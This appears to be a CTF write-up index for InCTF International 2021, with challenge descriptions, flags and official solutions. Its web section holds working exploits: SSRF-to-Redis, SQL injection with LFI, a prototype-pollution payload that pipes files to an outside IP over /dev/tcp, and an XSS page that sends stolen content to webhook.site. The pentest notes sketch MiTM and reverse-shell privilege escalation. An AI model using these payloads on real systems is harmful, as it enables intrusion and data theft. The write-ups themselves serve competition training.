# InCTF International 2021

InCTF International is a premier hacking event targeted at hackers of all ages, and as always, we will be carefully moulding challenges, loaded with the latest vulnerabilities, responsibly innovating to help you stay current and have an enjoyable time and experience.

| Title | Category | Points | Solves | Submitted | Solution | Flag | Official WriteUp |
|-------|----------|--------|--------|-----------|----------|------------------|------|
| [Sanity Check](#sanity-check) | Misc | 10 | 552 | ✔️ | ✔️ | ✔️ | ❔ |
| [Alpha Pie](#alpha-pie) | Misc | 100 | 58 | ✔️ | ✔️ | ✔️ | ❕ |
| [blackStab Cloud Services](#blackstab-cloud-services) | Misc | 1000 | 2 | ❌ | ❌ | ❌ | ✔️ |
| [Ancient_House](#ancienthouse) | Pwn | 545 | 33 | ❌ | ❌ | ❌ | ❔ |
| [Node Keeper](#node-keeper) | Pwn | 925 | 14 | ❌ | ❌ | ❌ | ❕ |
| [Kqueue](#kqueue) | Pwn | 984 | 7 | ❌ | ❌ | ❌ | ❔ |
| [Baby Glob](#baby-glob) | Pwn | 993 | 5 | ❌ | ❌ | ❌ | ❔ |
| [DeadlyFastGraph](#deadlyfastgraph) | Pwn | 996 | 4 | ❌ | ❌ | ❌ | ❕ |
| [MultiStorage](#multistorage) | Pwn | 1000 | 1 | ❌ | ❌ | ❌ | ❕ |
| [Right Now Generator](#right-now-generator) | Crypto | 100 | 51 | ❌ | ❌ | ❌ | ❔ |
| [Lost Baggage](#lost-baggage) | Crypto | 100 | 52 | ❌ | ❌ | ❌ | ❔ |
| [Gold_digger](#golddigger) | Crypto | 100 | 76 | ❌ | ❌ | ❌ | ❔ |
| [Eazy Xchange](#eazy-xchange) | Crypto | 179 | 44 | ❌ | ❌ | ❌ | ❔ |
| [Encrypted Operations](#encrypted-operations) | Crypto | 823 | 21 | ❌ | ❌ | ❌ | ❔ |
| [Trouble With Pairs](#trouble-with-pairs) | Crypto | 925 | 14 | ❌ | ❌ | ❌ | ❔ |
| [Tabula Recta](#tabula-recta) | Crypto | 996 | 4 | ❌ | ❌ | ❌ | ❔ |
| [Listen](#listen) | Network Pentest | 100 | 49 | ❌ | ❌ | ❌ | ❕ |
| [Shell Boi](#shell-boi) | Network Pentest | 956 | 11 | ❌ | ❌ | ❌ | ❕ |
| [Legacy](#legacy) | Network Pentest | 993 | 5 | ❌ | ❌ | ❌ | ❕ |
| [Home Drive](#home-drive) | Network Pentest | 993 | 5 | ❌ | ❌ | ❌ | ❕ |
| [Ermittlung](#ermittlung) | Forensics | 140 | 45 | ❌ | ❌ | ❌ | ❕ |
| [Darkness](#darkness) | Forensics | 887 | 17 | ❌ | ❌ | ❌ | ❕ |
| [Heist](#heist) | Forensics | 913 | 15 | ❌ | ❌ | ❌ | ❕ |
| [The Big Score](#the_big-score) | Forensics | 956 | 11 | ❌ | ❌ | ❌ | ❕ |
| [Heist Continues](#heist-continues) | Forensics | 984 | 7 | ❌ | ❌ | ❌ | ❕ |
| [Heist Ends](#heist-ends) | Forensics | 989 | 6 | ❌ | ❌ | ❌ | ❕ |
| [find_plut0](#findplut0) | Reverse | 100 | 116 | ❌ | ❌ | ❌ | ❔ |
| [REplica](#Rreplica) | Reverse | 723 | 26 | ❌ | ❌ | ❌ | ❔ |
| [Miz](#miz) | Reverse | 723 | 26 | ❌ | ❌ | ❌ | ❔ |
| [flagchecker](#flagchecker) | Reverse | 887 | 17 | ❌ | ❌ | ❌ | ❔ |
| [Noodes](#noodes) | Reverse | 900 | 16 | ❌ | ❌ | ❌ | ❔ |
| [Adventures of Lonely Knight (PART-1)](#adventures-of-lonely-knight-part-1) | Reverse | 936 | 13 | ❌ | ❌ | ❌ | ❔ |
| [MD Notes](#md_notes) | Web | 100 | 46 | ❌ | ❌ | ❌ | ❕ |
| [Raas](#raas) | Web | 100 | 73 | ❌ | ❌ | ❌ | ❕ |
| [Vuln Drive](#vuln-drive) | Web | 700 | 27 | ❌ | ❌ | ❌ | ❕ |
| [Json Analyser](#json-analyser) | Web | 804 | 22 | ❌ | ❌ | ❌ | ❕ |
| [Notepad 1 - Snakehole's Secret](#notepad-1-snakeholes-secret | Web | 823 | 21 | ❌ | ❌ | ❌ | ❕ |
| [Notepad 1.5 - Arthur's Article](#notepad-15-arthurs-article) | Web | 900 | 16 | ❌ | ❌ | ❌ | ❕ |
| [Notepad 2 - Ken's Chronicle](#notepad-2-kens-chronicle) | Web | 925 | 14 | ❌ | ❌ | ❌ | ❕ |

---

[❌ No WriteUp] [❔ Waiting for WriteUp] [❕ Short WriteUp] [✔️ Detailed WriteUp]


## Sanity Check

**Challenge**

Welcome to InCTFi 2021!

To get the flag, please grab it from #general in our discord: https://discord.gg/CZCYZNqC4B

**Solution**

Join the Discord server and check #general description banner.

Done! We have our flag "`inctf{welcome_t0_inctf_internationals_2021}`"

## Alpha Pie

**Challenge**

We have created a mini game to test your skills. Go grab the flag!!

authors : careless_finch, malf0y

`nc misc.challenge.bi0s.in 1337`

**Solution**

First let’s look at the rules:
```
Welcome to Alpha pie game!!!
Rules:
1. To complete one level you have match the left matrix to the right one by moiving each letter to their position in the right matrix
2. Moving to only adjecent column or row is possible.
3. Diagonal movements are not possible
4. negative numbers are not allowed in the input
5. The input format should be 'current-x-cord,current-y-cord,to-x-cord,to-y-cord'.
   eg : 0,0,0,1 (Will move letter at position 0,0 to position 0,1 if a letters is present at 0,0 and no letter is present at 0,1).
7. Number of moves will be limited for each level.
8. The game has a time limit of 'n' minutes.
9. You will lose the game if you enter certain number of invalid moves
10. After you pass 9 levels you will ge the flag.
   Good luck ! Enjoy the game 👍
```

To be more exact with rule 8, the game lasts a total of `500 seconds`.


We have about 1 minute per level, which is not much, so we will create a script that will calculate for us the movements we have to make in the game.


Take, for example, Level 1:
```
Level-1
Max number of moves allowed: 5
+-------+  +-------+
| 0 | 0 |  | s | h |
| h | s |  | 0 | 0 |
+-------+  +-------+
Current moves : 0
Enter move in the format 'current-x-cord,current-y-cord,to-x-cord,to-y-cord ' :
```

s must do:
- 1,1,0,1
- 0,1,0,0

then h must do:
- 1,0,1,1
- 1,1,0,1

So we simply use an `A-Star` algorithm.

You can find my script here: [alphapie.py](./alphapie.py)

Credits to Ryan Collingwood and Nicholas Swift for their A-Star algorithm: [astar.py](https://gist.github.com/ryancollingwood/32446307e976a11a1185a5394d6657bc)

You can find my full game here: [alphapie.txt](./alphapie.txt)

Done! We have our flag "`inctf{G00d_Job_e33ac7bae54893252e60c0187e793ef5d13d7dfa85fafa7984f8753b591247b9}`"

**Official WriteUp**

[sol.py](./alpha_pie_sol.py)

## blackStab Cloud Services

**Challenge**

Presenting you, blackStab Cloud Services a secure VM provider which lets you spawn your own VMs on the cloud with your favorite OS (may it be Arch or even Windows)

Note: On the occasion of inaguration, we're giving out 1000$ worth blackStab cloud credits for new users!!

Author: [f4lc0n](https://twitter.com/theevilsyn)

`misc.challenge.bi0s.in:1133`

[blackstab.zip](./blackstab.zip)

**Official WriteUp**

[Google Slides](
https://docs.google.com/presentation/d/1PrApTgj9wM3Z0No-hNXaMlsiNSy7o0GINlRI95pjkak/edit?usp=sharing)

## Ancient_House

**Challenge**

Someone's gotta stop those glibc nerds

The challenge runs the DEBUG build of jemalloc

Author : [Pwn-Solo](https://twitter.com/Pwn_Solo)

`nc pwn.challenge.bi0s.in 1230`

[Handout.zip](./Ancient_House.zip)

## Node Keeper

**Challenge**

Author: [3agl3](https://twitter.com/3agl31)

`nc pwn.challenge.bi0s.in 1234`

[handout.zip](./Node_Keeper.zip)

**Official WriteUp**

[exp.py](./node_keeper_exp.py)

## Kqueue

**Challenge**

A long queue awaits you in ring0.

md5sum : bzImage - `d7c173966e9fb6e79eaef8d351cb8f09` : kqueue.ko - `702ab39064a7b4ee1d33f7c484eeb77a`

Author - [Cyb0rG](https://twitter.com/_Cyb0rG)

username : password - `ctf:kqueue`

`nc pwn.challenge.bi0s.in 1279`

[Handout.zip](./Kqueue.zip)

## Baby Glob

**Challenge**

Super secure path finder from your own 2017.

md5sum : chall - `60aedc6cf9a7b163254cfc2ffea64c04`

Note - Standard `ubuntu 20.04` docker has been used.

Author - [Cyb0rG](https://twitter.com/_Cyb0rG)

`nc pwn.challenge.bi0s.in 1299`

[Handout.zip](./Baby_Glob.zip)

## DeadlyFastGraph

**Challenge**

I decided that DFG wasn't fast enough.

Author: [DarkKnight](https://twitter.com/_d4rkkn1gh7)

`nc pwn.challenge.bi0s.in 1212`

[DFGHandout.zip](./DFGHandout.zip) [DFGServer.zip](./DFGServer.zip)

**Official WriteUp**

Exploit:
[GitHub gist](https://gist.github.com/d4rk-kn1gh7/9bcd1d49dc07f05c371603fb4b96a651)

## MultiStorage

**Challenge**

You can now store two types of data in kernel.

Author: [3agl3](https://twitter.com/3agl31)

`nc pwn.challenge.bi0s.in 1235`

<details>
<summary>Hint</summary>
<p>Functions that may look irrelevant might have bigger affect than you think!</p>
</details>

[handout.zip](./MultiStorage.zip)

**Official WriteUp**

[exp.c](./MultiStorage_exp.c)

## Right Now Generator

**Challenge**

I just made the fastest RNG! No one can predict my machine.

Author : [Majin#6223](https://twitter.com/Alekh_Avinash)

[source.zip](./Right_Now_Generator.zip)

## Lost Baggage

**Challenge**

It seems I'm out of luck I just lost my bag the the airport. Can u help me find it?

Author : [Majin#6223](https://twitter.com/Alekh_Avinash)

[ori.zip](./Lost_Baggage.zip)

## Gold_digger

**Challenge**

Break the cipher and prove your worth!

[handout.txt](./Gold_digger.txt) [gold_digger.py](./gold_digger.py)

## Eazy Xchange

**Challenge**

My older brother found a new way to implement the DH Key Exchange. I tried my best to recreate his method. Hope I didn't make a mistake...

MD5 Hash: `src.zip 677edcba5b74a91d090abb46cfffb095`

Author : [Majin#6223](https://twitter.com/Alekh_Avinash)

[src.zip](./Eazy_Xchange.zip)

## Encrypted Operations

**Challenge**

Lets see how good you are at performing blind operations :)

> NOTE:
> To solve the challenge installation of pallisade or running the challenge files is not a necessity, analysing level.cpp code with pen and paper is enough!

MD5 Hash: `src.zip 93c7534260c4c76a95b5c6bb6775626d`

NOTE: flag format is inctfi{}

Author [Stryd3r](https://twitter.com/The_Str1d3r)

`nc crypto.challenge.bi0s.in 1221`

[src.zip](./Encrypted_Operations.zip)

## Trouble With Pairs

**Challenge**

We are testing a new Optimised Signature scheme for Authentication in our Voting System.

This might lead us to reduce the time taken for Election Process.

Author : [chandu-kona](https://twitter.com/chandu_kona)

`nc crypto.challenge.bi0s.in 1337`

[Handout.zip](./Trouble_With_Pairs.zip)

## Tabula Recta

**Challenge**

X made a stateless password manager and used it for all the top sites he visited. But on observing the code he found that his key could retrieve a maximum number of states and decided to not use it because of its weaknesses.

However, he did not get to reset all of his passwords.

We'll send you the names of some websites at `nc 34.106.211.122 1222`. If you are able to find most of the passwords, we'll give you the flag.

MD5sum : `072419cd201a7964c19a7177af1ec090 src.zip`

Author : [ph03n1x](https://twitter.com/MeenakshiSl1), [4lex1](https://twitter.com/SandhraBino)

[src.zip](Tabula_Recta.zip)

## Listen

**Challenge**

The quieter you become, the more you are able to listen.

Author: [f4lc0n](https://twitter.com/theevilsyn)

**Official WriteUp**

The host (172.30.0.8) will try to connect to the user's host on the ports between 31336-31338. Listen on the ports to accept the that connection and receive the flag.

## Shell Boi

**Challenge**

He sells linux shells on the shell store.

Author: [f4lc0n](https://twitter.com/theevilsyn)

**Official WriteUp**

There are 2 hosts in the network 172.30.0.5 and 172.30.0.8. Since this is a multi host environment, there are possibilities of MiTM attacks.  Perform an MiTM attack using tools like ettercap, you'll see that host A is sending IP and port details to host B, then host B sends reverse shell over that port. Now modify the IP and port to your local port and IP to get a reverse shell.

## Legacy

**Challenge**

There's no guarantee, it's not up to me, you can only see.

Author: [f4lc0n](https://twitter.com/theevilsyn)

**Official WriteUp**

There is a web server which uses legacy debug bridge api for users identified as admins. To get identified as admin, set a referer header as shown in the html page and send the debug request to the v1 api with bash commands to get RCE as www-data. 

Now, for privilege escalation - there is a cronjob running which tries lo load env variables from a file in www-data's scope and executes zcat. Create a fake zcat with reverse shell payload in the path variable set by you using the env file. Now wait for root to execute that with cron.

## Home Drive

**Challenge**

Tell us about our naive [NAS](http://172.30.0.8:5000/) architecture :P

Authors: [f4lc0n](https://twitter.com/theevilsyn), [amr_bal](https://twitter.com/amr_bal)

**Official WriteUp**

Download the apk, reverse it, understand the functionalities of the API server. Get access to the hidden FTP network by adding a manual route using ip route add and get the admin's public key. Now sign the JWT token with that key and login as admin. Now trigger the /admin/config request and send a malicious yaml for the server to load.

## Ermittlung

**Challenge**

Description

Our Incident Response team started their investigation on a device found when pinning down a terrorist. They got some doubts while analyzing the device, So they framed these questions can you help them in answering these questions? Our Intelligence report states that the terrorist used a legit chat application for communication among themselves.

Questions:

- What is the name of the chat application program?
    - Ex: `Mozilla_Firefox` (Use Name of the program, Not the name of the binary. If there is a space replace it with _. )

- When did the user last used this chat application?
    - Answer in `DD-MM-YYYY_HH:MM:SS`. Timestamp in UTC
    
- How many unread messages are there in the chat application that the user is using?
    - Answer should be an integer `n`.

- What is the current version of the chat application that's being used?
    - Answer in `X.X.XXXX.XXXX`

Note:
- Wrap the answers around inctf{}.
- Sample flag: `inctf{Mozilla_Firefox_31-07-2020_19:00:00_10_1.2.2345.5678}`
- Flag is Case Sensitive

Challenge Download Links:
- [Primary Link](https://drive.google.com/file/d/1qDZAtOLhVT-qr97W1bXo36poTMekvEOU/view?usp=sharing)

MD5 Hash: `ermittlung.raw 110305F3CF71432B4DFAFD1538CDF850`

Challenge Author: g4rud4

**Official WriteUp**

* Name of the chat application - **Outlook Express**

* HKEY_CURRENT_CONFIG\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{75048700-EF1F-11D0-9888-006097DEACF9}\count

    * msimn.exe - Main executable for Outlook Express - **27-07-2020 12:26:17 UTC**

* HKEY_CURRENT_CONFIG\Software\Microsoft\Windows\CurrentVersion\UnreadMail\danial.banjamin@gmail.com

    * The subkey **Message Count** gives the count of unread messages. ie: **4**

* HKEY_CURRENT_CONFIG\Software\Microsoft\Outlook Express\5.0\Shared Settings\Setup

    * The Subkey **MigToLWPVer** gives the current usage version of Outlook Express.
    * Version - **6.0.2900.5512**
  Or dump the process and check the little endian strings, you will get the version.

Flag: inctf{Outlook_Express_27-07-2020_12:26:17_4_6.0.2900.5512}

## Darkness

**Challenge**

Description: We have received the report that a certain employee of of an organization might have stolen confidential information and hidden in his system. We seized his laptop and collected a forensic image of the system. Our intel suggests that the employee might have visited suspicious websites and also deleted key files from the system which could've been vital for us. Could you please recover it?

Challenge link: https://storagefor.bi0s.in/Darkness-Evidence.7z
- [Mirror Link](https://drive.google.com/file/d/1vPGSUFxB6XO5zWsYATjDEr0ubAWrDiAD/view?usp=sharing)

Password (of the archive): `d:'2;]7{<-v5^4]tz@*s+%qqd}c|&mv]`

Author: [stuxn3t](https://twitter.com/_abhiramkumar)

**Official WriteUp**

1. The zip file is actually deleted from disk and can be recovered by extracting the Volume shadow copy from the .E01.
2. checking the browser history tells us that the employee visited pastebin but the exact paste link is not present (Basically the employee deleted a part of the history to cover his tracks).
3. MS Windows has a feature to collect Diagnostic Data which is optional. The data collected includes MS Edge Browser History, Installed programs info and much much more.
4. To extract the DB from the system, navigate to C:\ProgramData\Microsoft\Diagnosis\EventTranscript\EventTranscript.db and extract the file. Make sure to extract the -wal file too because that contains our required URL. Write Ahead Log files basically are used to maintain DB data and are written to original DB when system shuts down. That is why -wal file is important here.

5. Open the DB using any DB viewer and to view the browser history (Table - Events_presisted) and set the column filter logging_binary_name = msedge.exe.

6. In the payload section, as you dig into it, you observe the field "navigationUrl" contains the pastebin link - https://pastebin.com/cvRK3yY5

7. Navigate to the URL and supply the password obtained from the recovered deleted file - The flag is: inctf{th1s_d4y_w3_d1sc0veR3d_4_N3w_4R7iFaCt}

## Heist

**Challenge**

Challenge Description

Our Intelligence Bureau team found out a group of people roaming around a well-noted organization, and our team has captured them. After the interrogation, Our IB team found out the head of the heist they planned. While capturing the leader of the heist, Our team found some electronic devices like laptops, USB devices. Our evidence collection team captured the data from these devices and sent it to us for analysis. During evidence collection, The team found out that the leader of the heist was using a lot of browsers, remote desktop applications, Voice modulators etc. Our team needs some help from you in finding answers to some questions. Can you help the team in finding answers to these questions?

Questions:

1. What is the default browser that the Heist leader is using on the device?
    - Ex: `Opera_Mini`, etc (Use Name of the program, Not the name of the binary. If there is a space replace it with `_`)

2. What is the top-visited website in the leader's system on the default browser?
    - Answer in `domain.net` (`HTTP(s)://` or `www.` & sub-domains are NOT included)

3. When was the latest file transfer session initiated in TeamViewer?
    - Answer in `DD-MM-YYYY_HH:MM:SS`. Timestamp in UTC

4. What is the ID, Hostname of that file-transfer session?
    - Format: `123456789_Hostname`

Note:
1. Wrap the answers around inctf{}.
2. Sample Flag: `inctf{Opera_Mini_google.com_01-01-2012_01:01:10_123456789_Hostname}`
3. Flag is Case Sensitive

Download Link
- [Primary Link](https://storagefor.bi0s.in/Heist.7z)
    - Password: `H0Y7$8j!och^jjYJMsR45KU4SV`
- [Mirror Link](https://drive.google.com/drive/folders/1H3Ly8hnAW7eh7dxvf_bTA7_JYk8zMP3-?usp=sharing) - Splitted files, Not Password Protected.

MD5 Hash: `A916E26016180D2C5189061D652DC9E1 Heist.7z`

Challenge Author: [g4rud4](https://twitter.com/_Nihith)

**Official WriteUp**

1. From the NTUSER.DAT, we can find the default browser of the system.
    + Hive Location: `NTUSER.DAT: Software\Microsoft\Windows\Shell\Associations\UrlAssociations\{http|https}\UserChoice`.
    + We get Chrome as the default browser.

2. As we got the default browser, we can go check the TopSites Sqlite Database present in `Users/Danial Benjamin/AppData/Local/Google/Chrome/User Data/Default/` and sort it with URL rank we get **`ebay.com`**

3. On comparing `Connections_incoming.txt` and `Connections.txt` present in Teamviewer's appdata folder, we got the time File transfer session was initiated.
    + Time initiated: `20-07-2021_07:48:50`

4. We can find the ID and Hostname from the `Connections_incoming.txt` present in Teamviewer's appdata folder.
    + ID_Hostname: `920981533_DESKTOP-S34NLCJ`

Flag: inctf{Google_Chrome_ebay.com_20-07-2021_07:48:50_920981533_DESKTOP-S34NLCJ}

## The Big Score

**Challenge**

We sent Michael over to the Union Depository to collect data from one of their systems for the heist. We were able to retrieve the data, but it looks like they were able to read the message sent to us that Michael had typed from their system. Fortunately, he took the memory dump before escaping the building. Analyze the memory dump and find out how the message was compromised.

Challenge Link :
- [Primary Link](https://drive.google.com/drive/folders/1JZfwuASJ9e8LVWcB4py59AB7kxrKEKFK?usp=sharing)
- [Mirror Link](https://drive.google.com/drive/folders/1qzVvBS29lh8VwHWnmyqLscg0p11t8Vz3?usp=sharing)

MD5 Hash : 5bdcfc3d4a73020019fc61ab6e933395

Author : [d3liri0us](https://twitter.com/d3liri0us_)

**Official WriteUp**

+ Build Linux profile for Ubuntu 18.04 (linux-headers-5.4.0-42-generic)

    [Reference : https://github.com/volatilityfoundation/volatility/wiki/Linux]

+ Use linux_bash plugin in Volatility to recover memfd_create malware payload and decode it to retrieve the github link. (Alternate : Dump the malicious process to retrieve the github link)

+ Analyzing the code given in the repository, recover the bin/log file from the memory dump using linux_find_file plugin in Volatility and crack the specific hash to retrieve the file path in termbin.com. (Alternate : Since the whole process is recorded in the memory, doing a simple grep termbin.com will get you the link)

+ Decode the keyboard stream data from the link in order to retrieve the flag.

    [Reference : https://thehackerdiary.wordpress.com/2017/04/21/exploring-devinput-1/]

## Heist Continues

**Challenge**

Description

Our analyst team at Intelligence Bureau need answers for few more questions. Can you help them out in finding answers for below questions?

Questions:

1. What is the workspace ID and USER ID of the Slack workspace that is the user participating in?
    - Answer in `T0A0A0A0A0A_U0A0A0A0A0` (All in Uppercase)

2. There was a remote connection and we think there is a secret text on the remote connected PC's wallpaper. What are the first and last 3 characters of the secret text?
    - Format: `abcxyz`

3. Team restored 2 USB devices (Sandisk 3.2Gen1 & Toshiba External USB 3.0) at the leader's place. What is the file system of these 2 USB devices?
    - Format: `FileSystem1_FileSystem2` (All in caps)

4. Team found some traces of Voice Modulator, How much time did the user actively used this Voice Modulator?
    - Answer in `X` Seconds.

Note:
- Wrap the answers around inctf{}.
- Sample Flag: `inctf{T0A0A0A0A0A_U0A0A0A0A0_abcxyz_FileSystem1_FileSystem2_X}`
- The challenge file is same as that of Heist challenge.
- Flag is Case Sensitive

Challenge Author: [g4rud4](https://twitter.com/_Nihith)

**Official WriteUp**

1. We can go through **000004.log** file present in `Users/Danial Benjamin/AppData/Roaming/Slack/Local Storage/leveldb/000004.log`. We will get,
    + Workspace ID: T027GM97WJ3
    + USER ID: U027XK55WCT
2. AnyDesk stores the wallpaper present on the remote PC as a thumbnail. We can get the thumbnail by checking out this folder `Users/Danial Benjamin/AppData/Roaming/AnyDesk/thumbnails`.
    + First and last 3 characters: `a27da2`.
3. Decoding the hex present in Vbr0 present in `Microsoft-Windows-Partition-Diagnostic.evtx`.
    + `FAT32_NTFS`
4. We find the duration of how much time the user used a particular application from ActivityCache.db present at `C:\Users\%profile name%\AppData\Local\ConnectedDevicesPlatform\%profile name%\`.
    + We will see 4 instances of Voicemod used at different intervals. Adding all the active durations we get `800`.

Flag: inctf{T027GM97WJ3_U027XK55WCT_a27da2_FAT32_NTFS_800}

## Heist Ends

**Challenge**

Description

Our IB team recovered a mobile phone from one of the members of the gang. Can you help out the team in finding answers for the following questions?

Questions:

1. When did the Professor create the note for Rio?
     - Answer in `DD-MM-YYYY_HH:MM:SS`. Timestamp in UTC

2. Where did Professor and Rio, planned to meet for planning the heist?
     - Format: `Lat_Long` (round-off to 3 decimals)

3. When did Rio plan to meet Professor?
    - Answer in `DD-MM-YYYY_HH:MM:SS`. (In original timezone)

4. How many members did Rio gathered for the heist?
    - Format: `N` (Integer)

5. How many tasks did Rio created in planning the heist, and how many did he complete?
     - Format: `Created_Completed` in Integers

6. There is a secret code present in a document shared between Rio & Professor, can you find out what it is?
    - Format: `AB1234578PMFE`

7. We found a game installed on the device. When did Rio first open this game?
    - Answer in `DD-MM-YYYY_HH:MM:SS` in UTC

Note:
- Wrap the flag around inctf{}
- Sample flag: `inctf{01-01-2012_14:01:16_1.111_2.- 222_01-01-2012_14:01:00_1_0_0_AB1234578PMFE_01-01-2012_14:01:00}`
- Flag is Case Sensitive

Challenge Download Links:
- [Primary Link](https://drive.google.com/file/d/1hLgFoXYQA-brR8ucAKJa3lCRx94XXXRD/view?usp=sharing)
- [Mirror Link](https://amritauniv-my.sharepoint.com/:u:/g/personal/inctfj_am_amrita_edu/Ecfnrp8zcZdHsd-7PhCaP1ABxCZBo2qOPNM7AGQL1WnGhw?e=gBhDIA)

MD5 Hash: `Heist_ends.zip 28EB446FB1A2D3B408CBCCAFBBFBA86D`

Challenge Author: [g4rud4](https://twitter.com/_Nihith)

**Official WriteUp**

1. 2021-07-19_12:28:39 UTC (from keep.db)
2. 13.106_80.225 (From Slack messages or Google Tasks, https://goo.gl/maps/iDmTQoZgrZae95JL6)
3. 20-07-2021_15:30:00 (from slack messages(`SELECT datetime(ts, 'unixepoch'), json_extract(message_json,'$.text') AS INmessages from messages order by ts;`) or Google Tasks)
4. 11 (From slack messages)
5. 4_3 (from Tasks table in \data\data\com.google.android.apps.tasks\files\tasks-109039317116448576167\data.db)
6. We can find it in Google docs cache. Need to change the file extension and we will get the first page of the document.
  Location: data\data\com.google.android.apps.docs\cache\docs_glide\data\af91c7f5acecd5cc087896b2f11bef832af1aebbe98e6327aa9983799c2014d9
  We get "MintMMCT15AUG"
7. Game installed is Dr. Driving.
    First Open Time: \data\data\com.ansangha.drdriving\shared_prefs\com.google.android.gms.measurement.prefs
    We get: 1626782629126 -> July 20, 2021 12:03:49

Flag: inctf{19-07-2021_12:28:39_13.108_80.225_20-07-2021_21:00:00_11_4_3_MintMMCT15AUG_20-07-2021_12:03:49}

## find_plut0

**Challenge**

Find pluto , and get your Reward !!

Author: [bl4ck_Widw](https://twitter.com/N4m1th4_01)

`nc 34.94.181.140 4205`

[chall](./find_plut0)

## REplica

**Challenge**

Replication is the new thing.

Author: k4iz3n

[main_replica](./REplica)

## Miz

**Challenge**

Senpai plis find me a way.

Author: Freakston, silverf3lix

`nc 34.94.181.140 4200`

[miz](./miz)

## flagchecker

**Challenge**

Enter the correct flag with flag format.

Author: imm0rt4l_5t4rk

[flagchecker](./flagchecker)

## Noodes

**Challenge**

I noodes

Author: r3x

`nc 34.94.181.140 4210`

[ialert](./Noodes)

## Adventures of Lonely Knight (PART-1)

**Challenge**

A lonely adventure of loney knight fighting mobs, there might be a secret in the end.

Author: [fug1tive](https://twitter.com/fug1t1v31)

[full_game.nes](./full_game.nes)

## MD Notes

**Challenge**

Description: Here's a nice web application to host your notes.

Links: [Challenge](http://web.challenge.bi0s.in:5432/) | [Bot](http://web.challenge.bi0s.in:1337)

Author: [yadhu#2142](https://twitter.com/YadhuKrishna_)

[md-notes.zip](./md-notes.zip)

**Official WriteUp**

Solve script: [GitHub gist](https://gist.github.com/yadhukrishnam/83ba65195ace0f1d526091e248638caf)

## Raas

**Challenge**

Description: Since Everything is going online i decided to make a easy Requests as a Service Bot To Make life easier, But i seem to have messed up oops!!!

Links: [Challenge](http://web.challenge.bi0s.in:6969/)

Author: [Capt-k](https://twitter.com/Captainkay11)

[Dockerfile](./Raas.Dockerfile)

**Official WriteUp**

```py
from requests.sessions import session

ip="web.challenge.bi0s.in:6969"

url = f"http://{ip}/"

sess = session()

sess.get(url)

uid = (sess.cookies["userID"])

sess.post(url, data={"url":f"inctf://redis:6379/_set%20{uid}_isAdmin%20yes"})
sess.get(url)

print(sess.cookies["flag"])
```

## Vuln Drive

**Challenge**

Our new recruit worked on our new super secure file store and i am pretty sure he is good at what he does,it looks awesome. Backup link:http://web.challenge.bi0s.in:6006/

Note:Challenge will restart every 10 minutes

Author : Sk4d00.sh, Rohit

http://web.challenge.bi0s.in:6007/

**Official WriteUp**

```py
import requests

s=requests.Session()
url="http://web.challenge.bi0s.in:41666/"
path=""
s.post(url+'login',data={"username":"asdasd","password":"asdadssad"})
#You can access localhost by URL encoding the url
for i in range(33):
    for i in '1234567890abcdef':
        x = (path+i).encode().hex()
        data = {"url": f"http://123%40localhost?part1=%252527&part2=1,name from adminfo where path like 0x2f{x}25 union select 1"}# Sql injection using like
        r=s.post(url+'dev_test',data=data)
        if('Not' in r.text[:10]):
            path+=i
            print("Path :",path,end='\r')
            break
data = {"url": f"http://123%40localhost?part1=%252527&part2=1,name from adminfo where path=0x2f{(path).encode().hex()} union select 1"}
r = s.post(url+'dev_test', data=data)
#Checking if we got the full path and checking length
print(r.text)
if('Not' in r.text[:10]):
    print("Length :",len(path))
    print("Path is correct!")
#Using LFI to get the flag file
if path:
    print("Path :",path)
    r=s.get(url+'return-files?f=/'+path)
    print("Flag:",r.text)
```

## Json Analyser

**Challenge**

Welcome to JSON Analyser. Verify your role and get Subscription ID. Then start looking into your dump json file.

Note: Deployment gets killed every 10 minutes.

Challenge Author: Sayooj B Kumar#9588

[json_analyser.zip](./json_analyser.zip)

**Official WriteUp**

[exp.py](./json_analyzer_exp.py)
```json
{
    "name": {
      "__proto__":{
         "defaultFilter" : "e'));process.mainModule.require('child_process').execSync('/bin/bash -c \\'cat /* > /dev/tcp/34.139.180.142/50555\\'')//"
      }
     },
    "version": "1.0.0",
    "description": "",
    "main": "app.js",
    "dependencies": {
      "config-handler": "^2.0.3",
      "express": "^4.17.1",
      "express-fileupload": "^1.2.1",
      "nodemon": "^2.0.12",
      "squirrelly": "^8.0.8"
    },
    "devDependencies": {},
    "scripts": {
      "test": "echo \"Error: no test specified\" && exit 1"
    },
    "author": "",
    "license": "ISC"
 }
```

## Notepad 1 - Snakehole's Secret

**Challenge**

Description: Janet Snakehole, the rich aristocratic widow with a terrible secret, is being investigated by the FBI's number 1, Burt Tyrannosaurus Macklin. Burt found a website that she visits often. See if you can find anything.

Links: [Challenge](http://chall.notepad1.gq:1111/) | [Bot](http://web.challenge.bi0s.in:1337/)

Author: [Az3z3l](https://twitter.com/Az3z3l)

[snakeholessecret.zip](./snakeholessecret.zip)

**Official WriteUp**

```html
<!DOCTYPE html>
<!-- Attacker's note:  <img src/onerror="eval(window.name)"> -->
<html>
    <head>
        <title>
            Notepad#1 Exploit
        </title>
    </head>
    <body>
        <script>
            function sleep (time) {
                return new Promise((resolve) => setTimeout(resolve, time));
            }

            url = "http://chall.notepad1.gq:1111/"
            webhook = "https://webhook.site/"
            userCookie = "55a54008ad1ba589aa210d2629c1df41"
            endpoint1 = url + `find?startsWith=d&debug=y&Set-Cookie=id=${userCookie}%3B%20path=/get`

            endpoint2 = url 
 
            endpoint2payload = `document.cookie="id=${userCookie}; expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;";document.cookie=x;fetch('/get').then(response=>response.text()).then(data=>navigator.sendBeacon("${webhook}",data));`

            window.open(endpoint1)
            
            sleep(1000).then(() => {
                window.open(endpoint2, name=endpoint2payload)
            });

        </script>
```

## Notepad 1.5 - Arthur's Article

**Challenge**

Description: Arthur Morgan was asked to retrieve an important article from Cornwall's computer. Help him steal it.

Links: [Challenge](http://chall.notepad15.gq:1515/) | [Bot](http://web.challenge.bi0s.in:1337/)

Author: [Az3z3l#7404](https://twitter.com/Az3z3l)

[arthursarticle.zip](./arthursarticle.zip)

**Official WriteUp**

[GitHub issue](https://github.com/golang/go/issues/47711)

## Notepad 2 - Ken's Chronicle

Description: "Years ago, when I was backpacking across Western Europe, I was just outside of Barcelona, hiking in the foothills of Mount Tibidabo. I was at the end of this path, and I came to a clearing, and there was a lake, very secluded, and there were tall trees all around. It was dead silent. Gorgeous. And across the lake, I saw a beautiful woman bathing herself. But she was crying...". There is a rumor that the rest of the story is on this website. Help Ken Adams uncover it.

